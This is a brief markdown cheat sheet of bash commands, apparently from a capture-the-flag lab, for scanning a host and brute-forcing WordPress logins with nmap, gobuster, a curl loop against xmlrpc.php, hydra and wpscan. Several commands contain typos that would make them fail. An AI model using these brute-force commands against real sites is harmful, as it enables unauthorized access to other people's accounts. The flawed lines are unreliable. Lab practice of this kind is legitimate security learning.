### How to scan ports with nmap
```bash
IP_ADDR=
nmap -sV -sC -oA initial $IP_ADDR
```
### How to enumerate web server directories
```bash
WORDLISTS=
gobuster dir -u HTTP://${IP_ADDR} -w ${WORDLISTS} -t 100 -q -o gobuster.txt
```
## How to filter unique string
```bash
wc -l fsocity.dic # number of lines
sort fsocity.dic | uniq | wc -l # unique words
sort fsocity.dic | uniq > example_filtered.txt
```
### A LOTL attack 
```bash
username="admin"
password="password"
for pass in $(cat passwords.txt); do curl -s -X POST -d "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$username</value></param><param><value>$pass</value></param></params></methodCall>" http://10.10.6.115/xmlrpc.php | grep -q 'Incorrect username or password.' || echo "Found credentials: $username:$pass"; done
```
### How to bruteforce input fields with hydra
Username
```bash
IP_ADDR=
hydra -L fsocity.dic -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
hydra -L fsocity.di -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP_ADDR%2Fwp-admin%2F&testcookie=1:Invalid Username" -t 30
```
Password
```bash
IP_ADDR=
hydra -L example -P fsocity.dic $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you enter for the username" -t 30
hydra -l elliot -P fsocity.dic 1$IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP_ADDR%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```
### How to bruteforce input fields with wpscan
```bash
wpscan --url http://${IP_ADDR} --passwords fsocity.dic --usernames Elliot  
```
